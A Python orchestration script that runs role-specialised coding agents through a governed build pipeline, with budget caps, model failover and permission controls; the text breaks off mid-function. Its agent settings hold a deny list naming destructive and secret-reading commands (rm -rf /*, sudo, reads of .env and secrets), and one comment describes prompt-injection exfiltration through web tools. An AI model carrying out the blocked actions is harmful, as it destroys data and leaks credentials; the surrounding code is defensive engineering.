#!/usr/bin/env python3
"""factory.py — the autonomous app factory.

This is the composition that turns the Controller skeleton into "ask anything → the fleet ships it":
real, role-specialized agents drive a product through SPEC → BUILD → QA → REVIEW → LAUNCH doing REAL
work — real code, real tests — with a genuine test-driven fix loop. Untrusted generated code runs
inside the srt sandbox (network+FS restricted); the trusted agent runtime calls the model normally.
Every step is audited.

  factory.py agent <role> <repo> "<task>"        # run one role-specialized real agent
  factory.py build <product> "<charter>"         # run a product end-to-end through the line
  factory.py fleet <specs.json> [workers]        # build SEVERAL products concurrently (the factory)
  factory.py selftest                            # offline check (prompt assembly, no model calls)
Run with the agent-os venv python. Needs the `claude` CLI authenticated; pytest in the venv.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import psycopg

SCRIPTS = Path(__file__).resolve().parent
sys.path.insert(0, str(SCRIPTS))
import audit  # noqa: E402
import governance  # noqa: E402  — central spawn/write/action enforcement (reads the role manifests)
import killswitch  # noqa: E402

from aoscfg import ENV as _ENV, DB as _DB


import threading
_ctx = threading.local()   # per-build context (run/product/stage) so concurrent builds don't mix traces


def _trace(kind, role, prompt, output, rc, elapsed=None, cost_usd=0.0, tokens_in=0, tokens_out=0, model=None):
    """Persist a step's full I/O + real economics + the model used, for debugging/replay/reproducibility."""
    run = getattr(_ctx, "run", None)
    if not run:
        return
    try:
        import redact
        with psycopg.connect(_DB) as c, c.cursor() as cur:
            cur.execute("""INSERT INTO traces (run_id, product, stage, role, kind, prompt, output, rc,
                             elapsed_s, cost_usd, tokens_in, tokens_out, model)
                           VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)""",
                        (run, getattr(_ctx, "product", None), getattr(_ctx, "stage", None), role, kind,
                         redact.scrub((prompt or "")[:20000]), redact.scrub((output or "")[:20000]), rc,
                         elapsed, cost_usd, tokens_in, tokens_out, model))
            c.commit()
    except Exception:
        pass


def _stage_done(run, stage):
    """Crash-resume checkpoint: a stage is already complete if its agent step is recorded done in the
    traces we persist anyway. Re-running a crashed build skips finished stages — no DBOS needed for this."""
    try:
        with psycopg.connect(_DB) as c, c.cursor() as cur:
            cur.execute("""SELECT 1 FROM traces WHERE run_id=%s AND stage=%s AND kind='agent' AND rc=0
                           LIMIT 1""", (run, stage))
            return cur.fetchone() is not None
    except Exception:
        return False


def _log_comm(cid, sender, recipient, intent, content):
    """Record a durable handoff in the conversation fabric so the dashboard's comms graph + message
    queue reflect REAL agent-to-agent communication (not just the audit stream). Best-effort."""
    try:
        with psycopg.connect(_DB) as c, c.cursor() as cur:
            cur.execute("""INSERT INTO conversations (conversation_id, message_id, intent, sender, recipient, content)
                           VALUES (%s,%s,%s,%s,%s,%s)""",
                        (cid, f"{sender}->{recipient}-{int(time.time()*1000)}", intent, sender, recipient,
                         json.dumps(content)))
            c.commit()
    except Exception:
        pass

ROLES = Path.home() / "projects" / "control-plane" / "roles"
PRODUCTS = Path.home() / "projects" / "products"
from aoscfg import VENV_PY
MAX_FIX = 3  # bounded QA->BUILD re-flow attempts
MAX_REVIEW = int(os.environ.get("AOS_MAX_REVIEW", "1"))  # bounded REVIEW->BUILD->re-QA->re-review cycles
# Global backpressure: no matter how many builds run concurrently, total live agent subprocesses are
# capped here (each ~430MB) so a big fleet can't exhaust RAM or hammer the API into rate-limits.
_AGENT_SEM = threading.BoundedSemaphore(int(os.environ.get("AOS_MAX_AGENTS", "8")))
# Model policy (pinned for reproducibility; cheaper model for low-stakes stages; fallback on overload).
# Owner directive (2026-07-12): ALL agents default to OPUS as the first choice. Fable is the frontier model
# but burns too many subscription credits, so it's OPT-IN ONLY (per-call agent(model=...) or the
# 'fable_default_build' flag). If Opus has issues the CLI's --fallback-model drops to Sonnet automatically;
# deeper layers (transient retry/backoff, then Codex engine failover) are unchanged. Flexibility preserved:
# env vars + per-call agent(model=...) override.
BUILD_MODEL = os.environ.get("AOS_BUILD_MODEL", "claude-opus-4-8")
CHEAP_MODEL = os.environ.get("AOS_CHEAP_MODEL", "claude-haiku-4-5-20251001")
FALLBACK_MODEL = os.environ.get("AOS_FALLBACK_MODEL", "claude-sonnet-4-6")
# The frontier model — most capable but credit-expensive; opt-in only (never handed out as the fleet default).
FRONTIER_MODEL = os.environ.get("AOS_FRONTIER_MODEL", "claude-fable-5")

# Model-exhaustion COOLDOWN: once a model hits its subscription usage cap (see _MODEL_EXHAUSTED), remember it
# so the REST of the fleet skips straight to the fallback instead of each agent wasting a failed call on the
# capped model. TTL-bounded so it recovers automatically after the limit window resets. Process-local (one
# build = one process), which is exactly the right scope.
_MODEL_COOLDOWN = {}                       # model -> monotonic time it was last found exhausted
_COOLDOWN_TTL = int(os.environ.get("AOS_MODEL_COOLDOWN_S", "900"))   # 15 min default


def _note_exhausted(m):
    try:
        _MODEL_COOLDOWN[m] = time.monotonic()
    except Exception:
        pass


def _in_cooldown(m):
    t = _MODEL_COOLDOWN.get(m)
    return bool(t) and (time.monotonic() - t) < _COOLDOWN_TTL


def _default_build_model():
    """The fleet's default heavy-build model — Opus (BUILD_MODEL) — UNLESS the 'fable_default_build' feature
    flag is rolled on, in which case the credit-expensive Fable frontier model (FRONTIER_MODEL) is used
    instead. Opus is the owner's first choice (2026-07-12); Fable stays available but OPT-IN because it burns
    credits. Lets ops flip or gradually A/B the fleet's frontier model WITHOUT a deploy. FAIL-OPEN: any
    flag/DB error keeps BUILD_MODEL, so model selection can never break on a flag hiccup. An explicit per-call
    `model=` still overrides both."""
    try:
        import flags
        if flags.evaluate("fable_default_build", subject="fleet"):
            return FRONTIER_MODEL
    except Exception:
        pass
    if _in_cooldown(BUILD_MODEL):          # BUILD_MODEL recently hit its usage cap -> don't hand it out again yet
        return FALLBACK_MODEL
    return BUILD_MODEL
# Tools every factory agent may use beyond auto-accepted file edits. Web is on by default so research/
# intel/build agents can reach live data instead of guessing. Override per-deployment with AOS_AGENT_TOOLS
# (space-separated), or per-call via agent(..., tools=[...]). SECURITY: web access turns an agent into a
# potential exfiltration path under prompt-injection — for agents processing UNTRUSTED tenant input, pass
# tools=[] (charters are already sanitized by sanitize.py; this is the second layer of that defense).
AGENT_TOOLS = os.environ.get("AOS_AGENT_TOOLS", "WebSearch WebFetch").split()
_ROLE_TOOLS_CACHE = {}
# ISOLATED AGENT CONFIG (REBUILD-PLAN A4 — the "single most dangerous finding"): spawned agents must NOT
# inherit the developer's personal ~/.claude/settings.json (which sets defaultMode:bypassPermissions —
# auto-approving EVERYTHING and defeating the factory's own --permission-mode/--allowedTools guardrails,
# personal MCP servers, etc.). We point CLAUDE_CONFIG_DIR at a locked-down dir with a minimal settings.json
# and a SYMLINK to the host credentials so subscription-login auth still works. Idempotent.
_AGENT_CONFIG_DIR = Path(os.environ.get("AOS_AGENT_CONFIG_DIR", str(Path.home() / ".agent-os-claude")))
_AGENT_SETTINGS = {
    "permissions": {
        "deny": ["Read(./.env)", "Read(./.env.*)", "Read(./secrets/**)", "Read(**/.env)",
                 "Bash(git push --force:*)", "Bash(sudo:*)", "Bash(rm -rf /*)"],
        "defaultMode": "acceptEdits",   # NOT bypassPermissions — the factory's --allowedTools governs tools
    },
    "enableAllProjectMcpServers": False,
}


def _agent_config_dir():
    """The isolated CLAUDE_CONFIG_DIR every spawned agent uses (locked-down settings + shared host creds)."""
    try:
        d = _AGENT_CONFIG_DIR
        d.mkdir(parents=True, exist_ok=True)
        (d / "settings.json").write_text(json.dumps(_AGENT_SETTINGS, indent=2))
        creds = Path.home() / ".claude" / ".credentials.json"          # host login (subscription mode)
        link = d / ".credentials.json"
        # Keep the agents' creds in SYNC with the host's. A one-time symlink is NOT durable: claude refreshes
        # the OAuth token by atomic-rename, which replaces the symlink with a regular file that then goes STALE
        # while the host token keeps refreshing — every spawned agent then fails "OAuth session expired". So
        # COPY the host creds whenever they're newer than (or absent from) the isolated dir. (Found by a live
        # company-org run whose whole fleet failed auth on a week-old copy.)
        try:
            if creds.exists() and ((not link.exists()) or creds.stat().st_mtime > link.stat().st_mtime + 1):
                import shutil
                if link.is_symlink() or link.exists():
                    link.unlink()
                shutil.copy2(creds, link)
                link.chmod(0o600)
        except Exception:
            pass
        return str(d)
    except Exception:
        return None


def _role_tools(role):
    """PER-ROLE tool grant (REBUILD-PLAN A4): the allow-list is DERIVED FROM THE ROLE MANIFEST's `tools`
    list (explicit, versioned, per-role) — not a one-size global default. Was declared-but-not-wired: every
    role got the same AGENT_TOOLS regardless of manifest. Merges the manifest tools with the web tools
    (live data), deduped. governance.spawn_restrictions still applies deny-beats-allow on top. Falls back to
    AGENT_TOOLS only when a role has no manifest."""
    if role in _ROLE_TOOLS_CACHE:
        return _ROLE_TOOLS_CACHE[role]
    grant = list(AGENT_TOOLS)
    try:
        import yaml
        m = yaml.safe_load((ROLES / f"{role}.yaml").read_text()) or {}
        mt = m.get("tools") or []
        if mt:
            grant = list(dict.fromkeys(list(mt) + list(AGENT_TOOLS)))   # manifest tools first, + web, deduped
    except Exception:
        pass
    _ROLE_TOOLS_CACHE[role] = grant
    return grant


# A4 MCP tier: the KNOWN, vetted MCP servers a role may be granted via its manifest `mcp_servers`. {repo} is
# substituted at spawn. Start with filesystem (repo-scoped, no creds — verifiable now); slack/vercel/deploy
# slot in here once their creds land (governance ALREADY gates their mcp__* tools in approval_required_for).
_MCP_CATALOG = {
    "filesystem": ("npx", ["-y", "@modelcontextprotocol/server-filesystem", "{repo}"]),
}


def _role_mcp_config(role, repo):
    """The --mcp-config for a role, built from its manifest `mcp_servers` resolved against _MCP_CATALOG.
    Returns a config dict or None. WAS declared-not-wired: governance gated mcp__* tools but factory never
    spawned any MCP server, so those tools never existed for an agent. A role with no `mcp_servers` -> None,
    so every current role is byte-for-byte unchanged (zero blast radius)."""
    try:
        import yaml
        m = yaml.safe_load((ROLES / f"{role}.yaml").read_text()) or {}
        want = m.get("mcp_servers") or []
    except Exception:
        want = []
    servers = {}
    for name in want:
        spec = _MCP_CATALOG.get(name)
        if spec:
            cmd0, args = spec
            servers[name] = {"command": cmd0, "args": [a.replace("{repo}", str(repo)) for a in args]}
    return {"mcpServers": servers} if servers else None


_TRANSIENT = ("overloaded", "rate limit", "rate_limit", "429", "529", "503", "timeout", "temporarily")
# A pinned model hitting its SUBSCRIPTION usage cap (distinct from API overload above): the CLI's
# --fallback-model only covers overload, so a capped model just keeps failing. Detect it and SWITCH models.
_MODEL_EXHAUSTED = ("reached your", "usage-credits", "usage limit", "switch models with", "run /model",
                    "upgrade to continue", "out of credits")
# Cross-provider failover: when Claude/Anthropic is degraded or down (retries exhausted on transient
# errors), the SAME task is retried once on OpenAI Codex so the factory keeps moving. Set to "none" to
# disable. CODEX_MODEL is just the label recorded in the trace (Codex uses its own configured model).
FALLBACK_ENGINE = os.environ.get("AOS_FALLBACK_ENGINE", "codex").lower()
CODEX_MODEL = os.environ.get("AOS_CODEX_MODEL", "codex")
# Codex reports TOKENS, not USD, so its spend used to be recorded as $0 — meaning a PLATFORM failover to
# Codex burned real OpenAI money that never counted against the budget cap (cost-runaway risk). Convert
# tokens -> USD with an estimate (USD per 1M tokens, input/output); override via env if the real rate differs.
CODEX_PRICE = (float(os.environ.get("AOS_CODEX_PRICE_IN", "2.5")),
               float(os.environ.get("AOS_CODEX_PRICE_OUT", "10.0")))


def _codex_cost(tin, tout):
    """Estimated USD for a Codex turn from its token counts, so Codex spend is counted, not recorded as $0."""
    return (int(tin or 0) * CODEX_PRICE[0] + int(tout or 0) * CODEX_PRICE[1]) / 1_000_000
# Per-factory BUDGET control (a tenant tunes these to their wallet). AOS_BUDGET_USD is a soft cap on total
# spend for this process: once reached, agent() refuses to spawn new work and escalates instead of running
# away. DEFAULT is a HIGH RUNAWAY BACKSTOP ($200), not unlimited — an UNATTENDED run must not burn forever if
# a loop gets stuck (the owner's "cost is not a concern, go deep" is still honored: this is deliberately high,
# scale.apply raises it further with the wallet, and AOS_BUDGET_USD=0 opts into truly unlimited). Hitting it is
# logged LOUDLY + escalated, never silent — a safety net in the North-Star sense (high backstop, never a
# quality terminator).
BUDGET_USD = float(os.environ.get("AOS_BUDGET_USD", "200") or 0)
_SPENT = [0.0]
_SPENT_LOCK = threading.Lock()

# BUDGET -> CAPABILITY SCALER (scale.py). The "tokens -> capability" mapper turns a tenant's wallet into a
# capability profile (more $ -> more concurrent agents, deeper recursion, higher verification rigor, more
# design exploration). Wired into the build path here so the knobs actually scale with spend instead of
# the mapper sitting dead. Applied ONCE per process, idempotently and thread-safely (a fleet starts many
# build threads at once): the first build/agent to run sets the env knobs and rebinds the live agent-
# concurrency semaphore from them. We only scale when a real wallet (AOS_BUDGET_USD > 0) is set — with no
# budget we leave the operator's explicit AOS_* env untouched (don't clobber hand-tuned knobs).
_SCALE_LOCK = threading.Lock()
_SCALE_APPLIED = [False]


def _apply_scale():
    global _AGENT_SEM, BUDGET_USD
    if _SCALE_APPLIED[0] or not BUDGET_USD:
        return
    with _SCALE_LOCK:
        if _SCALE_APPLIED[0]:
            return
        try:
            import scale
            prof = scale.profile(BUDGET_USD)
            applied = scale.apply(prof)                 # sets AOS_MAX_AGENTS/RIGOR/MAX_DEPTH/EXPLORATION/...
            BUDGET_USD = float(os.environ.get("AOS_BUDGET_USD", "0") or 0)
            _AGENT_SEM = threading.BoundedSemaphore(int(os.environ.get("AOS_MAX_AGENTS", "8")))
            audit.append(actor="factory:controller", action="ScaleProfile", resource="factory",
                         decision="applied", payload={"profile": prof, "env": applied})
        except Exception:
            pass                                        # never block a build on the scaler — fall back to env defaults
        finally:
            _SCALE_APPLIED[0] = True


def spent_usd():
    return _SPENT[0]


def _add_spend(c):
    if c:
        with _SPENT_LOCK:
            _SPENT[0] += float(c)


def role_brief(role: str) -> str:
    """A role-aware system preamble pulled from the governed manifest. It must do more than name the
    role: it instills an ELITE standard, ownership, an adversarial/verify mindset, the role's concrete
    responsibilities, and the duty to COMMUNICATE/FLAG to other roles — then the constitutional limits.
    A thin brief produces a generic, unaccountable worker (that is how 'unskilled QA' shipped bugs);
    a rich brief produces a top-tier professional who owns the outcome."""
    f = ROLES / f"{role}.yaml"
    if not f.exists():
        return f"You are the {role}."
    import yaml
    m = yaml.safe_load(f.read_text())
    name = m.get("display_name", role)
    never = "; ".join(m.get("must_never", [])) or "—"
    paths = ", ".join(m.get("allowed_paths", [])) or "your assigned repo only"
    resp = m.get("responsibilities") or ([m.get("summary")] if m.get("summary") else [])
    resp_lines = "\n".join(f"  - {r}" for r in resp) if resp else "  - (see mission)"
    comms = ", ".join(m.get("communicates_via", [])) or "the org channel / escalation to the controller"
    return (
        f"You are the {name} ({role}) in a governed agent OS — and you are among the most qualified "
        f"people in the world at this role. Hold yourself to the standard of a top hire at Jane Street, "
        f"Google, or McKinsey: rigorous, precise, and accountable. 'Good enough' is a failure; mediocrity "
        f"is not acceptable.\n"
        f"Mission: {m.get('summary', '')}\n"
        f"You OWN your work end-to-end. No one will silently clean up after you; what you hand off is "
        f"treated as final and correct. Take full responsibility for the outcome, not just the task.\n"
        f"Work to a verify-first standard: assume your first attempt has a flaw, then PROVE it works by "
        f"actually exercising it (run it, click it, test the real path) — never by assuming or reading "
        f"alone. 'Done' means demonstrated, with evidence; not 'should work'. Think adversarially: hunt "
        f"the edge cases, the empty/error states, and the ways a real user or attacker breaks it.\n"
        f"Your responsibilities:\n{resp_lines}\n"
        f"COMMUNICATE and FLAG: you are one member of a team. The moment you find something outside your "
        f"lane, a risk, a broken dependency, or anything another role must know — raise it explicitly via "
        f"{comms} to the relevant owner. Staying silent about a problem you saw is negligence, not "
        f"politeness. When blocked or uncertain, escalate early with specifics rather than guessing.\n"
        f"Constitutional limits — you may only write within: {paths}. "
        f"Rules you must NEVER break: {never}. "
        f"Never touch .env, secrets, or anything outside your assigned repo.")


def _extract_json(text):
    import re
    m = re.search(r"\{.*\}", text or "", re.S)
    if m:
        try:
            return json.loads(m.group(0))
        except Exception:
            pass
    return {}


def _heuristic_estimate(role, task):
    """Fast, spawn-free timeout/retry budget from role + task size. The estimate ONLY bounds the wall-clock
    timeout and retry count — it is not a correctness input — and the output-independent heartbeat + 6h hard
    ceiling (overhaul Step 1) are the real liveness guards, so an approximate budget is entirely safe."""
    n = len(task or "")
    r = (role or "").lower()
    heavy = any(k in r for k in ("research", "build", "dev", "engineer", "implement", "architect",
                                 "design", "qa", "review", "spec"))
    if n < 300 and not heavy:
        mins = 3
    elif n < 1500:
        mins = 8 if heavy else 5
    else:
        mins = 25 if heavy else 12
    rets = 3 if any(k in r for k in ("research", "build", "implement", "engineer")) else 2
    return max(2, min(60, mins)), max(0, min(3, rets))


def _estimate_runtime(role, task, env):
    """Timeout/retry budget for a heavy agent call. DEFAULT: a fast heuristic (no extra `claude` spawn) —
    the LLM handshake below was a SECOND cold subprocess per stage (~30-60s) purely to guess a timeout,
    doubling per-stage latency on subscription runs. The estimate only bounds the budget (liveness is the
    heartbeat + hard ceiling), so the heuristic is safe. Opt into the callee-driven LLM handshake with
    AOS_LLM_ESTIMATE=1 when a precise per-task estimate is worth the extra cheap-model call."""
    if not os.environ.get("AOS_LLM_ESTIMATE"):
        return _heuristic_estimate(role, task)
    q = ("You are the " + role + ". You are about to do the TASK below, but FIRST only ESTIMATE it. "
         "Reply with ONLY a JSON object: {\"minutes\": <int realistic wall-clock estimate>, "
         "\"retries\": <int 0-3, how many retries this is worth if it fails>}. Judge by the task's TRUE "
         "complexity — a deep/research/multi-file task may be 20-45+ min; a tiny one 1-2 min.\n\nTASK:\n" + task)
    try:
        p = subprocess.run(["claude", "-p", q, "--output-format", "json", "--model", CHEAP_MODEL,
                            "--fallback-model", FALLBACK_MODEL],   # estimation is low-stakes -> cheap model
                           cwd=str(PRODUCTS), capture_output=True, text=True, timeout=120, env=env)
        j = json.loads(p.stdout)
        est = _extract_json(j.get("result", ""))
        mins = int(est.get("minutes", 5))
        rets = int(est.get("retries", 2))
    except Exception:
        mins, rets = 5, 2
    mins = max(2, min(60, mins))      # never below 2m, never hang past 60m
    rets = max(0, min(3, rets))
    return mins, rets


CONTROL_PLANE = Path.home() / "projects" / "control-plane"


def _changed_paths(repo):
    """The files a just-run agent created/modified in `repo`, as absolute paths — the input to the
    governance write backstop. Uses `git status --porcelain` (modified + untracked). Returns [] when the
    repo isn't a git checkout (nothing reliable to diff against) so the backstop simply no-ops there."""
    try:
        p = subprocess.run(["git", "-C", repo, "status", "--porcelain", "--untracked-files=all"],
                           capture_output=True, text=True, timeout=30)
        if p.returncode != 0:
            return []
        out = []
        for line in (p.stdout or "").splitlines():
            if not line.strip():
                continue
            path = line[3:]
            if " -> " in path:                     # rename/copy: the destination is the written path
                path = path.split(" -> ", 1)[1]
            out.append(str(Path(repo) / path.strip().strip('"')))
        return out
    except Exception:
        return []


def _govern_writes(role, repo):
    """Post-run WRITE backstop (secondary to the PreToolUse hook; PRIMARY for the Codex engine, which
    does not honor claude hooks). governance.validate_writes flags every changed path that is either a
    denied_path (.env/secrets/registry/.github/...) or outside the role's allowed_paths — and audits all
    of them. We HARD-REVERT the denied_path writes (genuinely forbidden, never legitimate), but only
    audit-WARN the outside_allowed_paths ones: a role's allowed_paths can be legitimately narrower than
    its real output (a web/extension builder writes index.html / manifest.json at the repo root), so we
    must NOT destroy core build output over a too-narrow allowlist."""
    changed = _changed_paths(repo)
    if not changed:
        return
    try:
        violations = governance.validate_writes(role, repo, changed)
    except Exception:
        return
    reverted = []
    for v in violations:
        if v.get("reason") != "denied_path":       # outside_allowed_paths -> audit-warn only (already audited)
            continue
        rel = v["path"]
        target = Path(repo) / rel
        try:
            tracked = subprocess.run(["git", "-C", repo, "ls-files", "--error-unmatch", rel],
                                     capture_output=True, text=True, timeout=15).returncode == 0
            if tracked:                            # forbidden EDIT to a tracked file -> restore committed
                subprocess.run(["git", "-C", repo, "checkout", "HEAD", "--", rel],
                               capture_output=True, text=True, timeout=15)
            elif target.exists():                  # forbidden NEW file -> remove it
                target.unlink()
            reverted.append(rel)
        except Exception:
            pass
    if reverted:
        audit.append(actor=f"factory:{role}", action="GovernanceWriteReverted", resource=Path(repo).name,
                     decision="reverted", payload={"paths": reverted[:10], "count": len(reverted)})
        try:
            import notify
            notify.send(f"⛔ reverted {len(reverted)} forbidden write(s) by '{role}' in {Path(repo).name}: "
                        + ", ".join(reverted[:5]), title="governance", priority="high", tags="shield")
        except Exception:
            pass


def _run_once(role, repo, prompt, timeout, env, model, tools=None):
    cmd = ["claude", "-p", prompt, "--permission-mode", "acceptEdits", "--output-format", "json",
           "--model", model, "--fallback-model", FALLBACK_MODEL]   # pin + auto-fallback on overload
    # Grant the agent the tools its job needs. File edits already flow via acceptEdits; non-edit tools
    # (WebSearch/WebFetch and friends) must be allow-listed or the agent can't reach them. Additive —
    # builders keep Edit/Write AND gain web. Configure the default set with AOS_AGENT_TOOLS.
    grant = tools if tools is not None else _role_tools(role)
    if grant:
        cmd += ["--allowedTools", *grant]
    # GOVERNANCE (spawn restrictions — deny beats allow). Disallow the tools the role's manifest forbids
    # (denied_tools + capability-gated tools: posting/deploy tools, Edit/Write when read-only, Task when
    # it may not spawn), and deny READS of secret/denied paths as Read(<glob>) permission rules.
    restr = governance.spawn_restrictions(role)
    disallow = list(restr["disallowed_tools"]) + [f"Read({g})" for g in restr["deny_read"]]
    if disallow:
        cmd += ["--disallowedTools", *disallow]
    # The deterministic PreToolUse block (enforce_manifest.py) keys on THIS role's manifest — point it
    # there so a repo that wires the hook enforces the same deny_read/denied_paths at the source.
    mpath = ROLES / f"{role}.yaml"
    genv = {**(env or os.environ)}
    _cfg = _agent_config_dir()                        # isolate from the dev's bypassPermissions settings
    if _cfg:
        genv["CLAUDE_CONFIG_DIR"] = _cfg
    if mpath.exists():
        genv["CP_MANIFEST"] = str(mpath); genv["CP"] = str(CONTROL_PLANE)
    # MCP (A4): connect the MCP servers the role's manifest declares so its governed mcp__* tools actually
    # exist. Additive + fail-safe — a role with no `mcp_servers` gets no flag (byte-for-byte unchanged); the
    # temp config is always cleaned up (no /tmp leak). --strict-mcp-config ignores any ambient MCP config.
    _mcpf = None
    _mcpcfg = _role_mcp_config(role, repo)
    if _mcpcfg and _mcpcfg.get("mcpServers"):
        import tempfile
        _mcpf = tempfile.NamedTemporaryFile("w", suffix=".mcp.json", delete=False, dir="/tmp")
        json.dump(_mcpcfg, _mcpf); _mcpf.close()
        cmd += ["--mcp-config", _mcpf.name, "--strict-mcp-config"]
    try:
        # CROSS-PROCESS GATE (deeper F12 fix): hold one of a global N-slot pool for the duration of the claude
        # call, so TOTAL concurrent claude calls across ALL processes (build/QA/jobd/console/…) is capped —
        # the per-process semaphore above can't do that. Fail-open: if no slot frees in time it runs ungated
        # (brief over-subscription beats a deadlocked fleet).
        import claude_gate
        with claude_gate.slot(f"{role}:{os.getpid()}"):
            p = subprocess.run(cmd, cwd=repo, capture_output=True, text=True, timeout=timeout, env=genv)
    finally:
        if _mcpf:
            try:
                os.unlink(_mcpf.name)
            except Exception:
                pass
    _govern_writes(role, repo)                      # post-run write backstop: revert/audit out-of-scope writes
    out_text, cost, tin, tout, used = (p.stdout or ""), 0.0, 0, 0, model
    try:
        j = json.loads(p.stdout)
        out_text = j.get("result", "") or ""
        cost = float(j.get("total_cost_usd") or 0)
        u = j.get("usage") or {}
        tin = int(u.get("input_tokens", 0)) + int(u.get("cache_read_input_tokens", 0)) + int(u.get("cache_creation_input_tokens", 0))
        tout = int(u.get("output_tokens", 0))
        used = model   # record the PINNED model (reproducibility anchor); CLI may use cheaper models internally
    except Exception:
        pass
    return p.returncode, out_text, cost, tin, tout, used


def _run_once_codex(role, repo, prompt, timeout, env):
    """Fallback engine: run the SAME task via OpenAI Codex (`codex exec`) when Claude is unavailable.
    Returns the SAME tuple shape as _run_once. Codex reports tokens (not USD) in its `turn.completed`
    JSONL events, so we convert them to an estimated USD (_codex_cost) — otherwise the spend records as $0
    and a platform failover burns uncounted money. `used` records the Codex engine label so the trace shows
    which engine produced the stage. Uses the platform's Codex auth (workspace-write sandbox = it may
    edit files in the repo, like the Claude path). Honest note: a BYO-key tenant is NOT failed over here
    (the caller gates that) so we never silently spend platform OpenAI on a tenant's behalf."""
    tmp = Path(tempfile.mkdtemp(prefix="codexrun-"))
    out_file = tmp / "last.txt"
    cmd = ["codex", "exec", "--skip-git-repo-check", "-s", "workspace-write", "--json",
           "-o", str(out_file), prompt]
    try:
        p = subprocess.run(cmd, cwd=repo, capture_output=True, text=True, timeout=timeout, env=env)
        _govern_writes(role, repo)                  # Codex ignores claude hooks -> this backstop is PRIMARY here
        tin = tout = 0
        for line in (p.stdout or "").splitlines():
            try:
                o = json.loads(line)
                if o.get("type") == "turn.completed":
                    u = o.get("usage", {})
                    tin += int(u.get("input_tokens", 0)); tout += int(u.get("output_tokens", 0))
            except Exception:
                pass
        out_text = out_file.read_text().strip() if out_file.exists() else (p.stdout or "")
        return p.returncode, out_text, _codex_cost(tin, tout), tin, tout, CODEX_MODEL   # real spend, not $0
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def _agent_codex(role, repo, prompt, codex_key, timeout=600):
    """Run an agent on Codex as the PRIMARY engine (for tenants who only have an OpenAI/Codex key).
    Bounded retries, the tenant's key in the env, same trace/spend/audit bookkeeping as the Claude path."""
    cenv = {**os.environ}
    if codex_key:
        cenv["OPENAI_API_KEY"] = codex_key
    last_out = ""
    for attempt in range(2):
        try:
            with _AGENT_SEM:
                rc, out_text, cost, tin, tout, used = _run_once_codex(role, repo, prompt, timeout, cenv)
        except subprocess.TimeoutExpired:
            timeout = min(900, int(timeout * 1.5)); last_out = "timeout"; continue
        _add_spend(cost)
        audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                     decision="executed", payload={"engine": "codex", "rc": rc, "attempt": attempt + 1})
        _trace("agent", role, prompt, out_text, rc, 0.0, cost, tin, tout, used)
        if rc == 0 and out_text.strip():
            return {"rc": 0, "out": out_text[-1500:], "out_full": out_text, "cost_usd": cost, "tokens_in": tin,
                    "tokens_out": tout, "attempts": attempt + 1, "model": used}
        last_out = out_text
        time.sleep(4 * (attempt + 1))
    return {"rc": 1, "out": (last_out or "")[-1500:], "out_full": last_out or "", "failed": True, "reason": "codex exhausted"}


def _codex_fallback_env():
    """Return (env, source) for Codex failover, or (None, reason) when it is not allowed.

    Rules:
      * no Codex CLI / disabled fallback -> no fallback;
      * explicit _ctx.codex_key wins (tenant primary Codex path and tests);
      * tenant Claude runs may fall over only to THAT tenant's connected OpenAI/Codex provider
        (api_key or subscription), never silently to platform OpenAI;
      * platform/internal runs with no tenant keep the old behavior: use the host Codex auth.
    """
    if FALLBACK_ENGINE != "codex":
        return None, "disabled"
    if not shutil.which("codex"):
        return None, "codex-cli-missing"
    cenv = {**os.environ}
    explicit = getattr(_ctx, "codex_key", None)
    if explicit:
        cenv["OPENAI_API_KEY"] = explicit
        return cenv, "ctx-codex-key"
    tenant = getattr(_ctx, "tenant", None)
    if tenant:
        try:
            import tenantproviders
            r = tenantproviders.resolve_provider(tenant, "openai")
        except Exception:
            r = None
        if r and r.get("connected") and r.get("engine") == "codex":
            if r.get("auth_mode") == "api_key":
                cenv["OPENAI_API_KEY"] = r.get("key") or ""
            return cenv, f"tenant-openai-{r.get('auth_mode') or 'unknown'}"
        return None, "tenant-has-no-codex"
    # A BYO-key run (tenant paying with their OWN Anthropic key, set on _ctx.api_key even without a full
    # tenant record) must NEVER fall over to platform-funded Codex: that would silently bill the platform
    # for the tenant's outage AND override their explicit choice of Anthropic. Only an explicit codex_key or
    # their own connected Codex provider (both handled above) qualifies — otherwise escalate, don't failover.
    if getattr(_ctx, "api_key", None):
        return None, "byo-key-no-platform-failover"
    return cenv, "platform-codex"


def agent(role: str, repo: str, task: str, timeout: int = None, retries: int = None, model: str = None,
          tools: list = None, spawner: str = None, light: bool = False) -> dict:
    """Run one role-specialized agent (headless claude), RESILIENTLY. Timeout + retry from the CALLEE's
    own estimate (pre-flight handshake). Model is pinned (reproducible) with --fallback-model on overload;
    low-stakes stages pass a cheaper model. A timeout no longer kills the stage (retry w/ backoff),
    transient errors back off longer, a bad BYO key fails fast, exhausted retries escalate.

    LATENCY FAST PATH (light=True): for QUICK CONVERSATIONAL turns — the controller's clarify/say replies,
    chit-chat, option discussion — where a ~30s cold-spawn of Opus + the FULL role charter + a pre-flight
    estimate handshake is unacceptable next to a chat UI. light mode (a) defaults to the FAST model
    (CHEAP_MODEL/haiku) instead of Opus, (b) sends a MINIMAL system preamble instead of role_brief's elite
    charter (the caller's `task` already carries its own system+context+conversation, so the charter is pure
    overhead here), and (c) SKIPS the estimate handshake (fixed short timeout, no retries) so there's only
    ONE model round-trip. All the governance/consent/provider/budget/killswitch gates below still apply —
    light only changes model + prompt weight + the pre-flight, never the safety chokepoints. Heavy work
    (research/build/spec/review) leaves light=False and keeps the strong model + full charter."""
    model = model or (CHEAP_MODEL if light else _default_build_model())
    _apply_scale()                                    # dial capability (agents/rigor/depth) to the wallet
    # GOVERNANCE (can_spawn gate): the factory spawns this sub-agent ON BEHALF of the orchestrating role.
    # Thread the REAL requester (explicit arg > per-build _ctx.spawner > the controller that drives the
    # line) so can_spawn is enforced against who actually asked, not a hardcoded 'controller'.
    spawner_role = spawner or getattr(_ctx, "spawner", None) or "controller"
    # A genuine denial must refuse like every OTHER guard below (budget/killswitch/governor): return the
    # standard {rc:-1, blocker} dict, NOT raise — a bare governance.enforce() PermissionError would wedge
    # EVERY agent() call. But a manifest we cannot even LOAD (missing/unreadable -> {}) is infra failure,
    # not a real deny: bricking the whole fleet on a config hiccup is the wrong trade, so we fail OPEN +
